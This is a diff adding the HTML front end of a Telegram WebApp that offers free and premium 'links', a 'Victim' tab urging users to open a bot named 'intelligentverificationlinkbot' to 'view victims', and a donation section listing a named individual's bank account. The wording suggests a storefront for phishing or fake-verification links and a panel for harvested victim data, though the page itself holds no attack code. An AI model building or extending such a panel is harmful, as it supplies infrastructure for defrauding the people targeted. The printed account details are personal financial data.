@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Links WebApp — Telegram</title>
+  <meta name="description" content="Telegram WebApp — list & copy links, premium gating, donate, victim bot" />
+<link rel="stylesheet" href="mystyle.css">
+</head>
+<body>
+  <div class="wrap">
+    <!-- Header -->
+    <header>
+      <div class="brand">
+        <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="logo"></div>
+        <div>
+          <h1>Links WebApp</h1>
+          <p class="lead">Your personalized link list — works with Telegram WebApp</p>
+        </div>
+      </div>
+      <div style="text-align:right">
+        <div id="user-name" class="muted">Not signed in</div>
+        <div id="user-handle" class="muted" style="font-size:13px"></div>
+      </div>
+    </header>
+
+    <!-- Main Card -->
+    <div class="card">
+      <div style="display:flex;align-items:center;justify-content:space-between;">
+        <div>
+          <strong id="welcome">Welcome 👋</strong>
+          <div class="muted" style="font-size:13px">Tap any tab below or use the bottom navigation</div>
+        </div>
+        <div style="display:flex;gap:8px">
+          <button id="refresh-btn" class="btn small">Refresh</button>
+          <button id="copy-id-btn" title="Copy your Telegram ID" class="btn small ghost">Copy ID</button>
+        </div>
+      </div>
+      <div class="tabs" style="margin-top:14px">
+        <div class="tab-btn active" data-target="home">Home</div>
+        <div class="tab-btn" data-target="premium">Premium</div>
+        <div class="tab-btn" data-target="victim">Victim</div>
+        <div class="tab-btn" data-target="donate">Donate</div>
+      </div>
+
+      <!-- Sections -->
+      <section id="home" class="section active">
+        <div class="links-grid" id="free-links"></div>
+      </section>
+      <section id="premium" class="section">
+        <div id="premium-wrap">
+          <strong>Premium Links</strong>
+          <div class="links-grid" id="premium-links"></div>
+          <div id="premium-msg" style="margin-top:10px;color:var(--muted);font-size:13px"></div>
+        </div>
+      </section>
+      <section id="victim" class="section">
+        <div class="card" style="padding:14px">
+          <h3>Open bot to view victims</h3>
+          <div class="victim-cta">
+            <div style="display:flex;gap:12px;align-items:center">
+              <div style="width:72px;height:72px;border-radius:12px;background:#071028;display:grid;place-items:center;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="48">
+              </div>
+              <div><strong>intelligentverificationlinkbot</strong></div>
+            </div>
+            <button id="open-victim-bot" class="open-bot">Open Bot →</button>
+          </div>
+        </div>
+      </section>
+      <section id="donate" class="section">
+        <div class="donate-list">
+          <div class="donate-item"><span>BTC Wallet</span><span class="muted">Copy from script</span></div>
+           <div class="donate-item"><span>Bank  Transfer</span><span class="muted">
+             <li>Account No: 9114301708</li>
+                <li>Bank Name: Opay</li>
+                   <li>Recepient Name: Olatunji Abdulmalik Ayomide</li>
+           </span></div>
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <!-- Bottom nav -->
+  <div class="bottom-nav">
+    <div class="nav-item active" data-target="home">Home</div>
+    <div class="nav-item" data-target="premium">Premium</div>
+    <div class="nav-item" data-target="victim">Victim</div>
+    <div class="nav-item" data-target="donate">Donate</div>
+  </div>
+
+  <!-- Script -->
+    <script src="premiumlist.js"></script>
+<script src="main.js"></script>
+</body>
+</html>
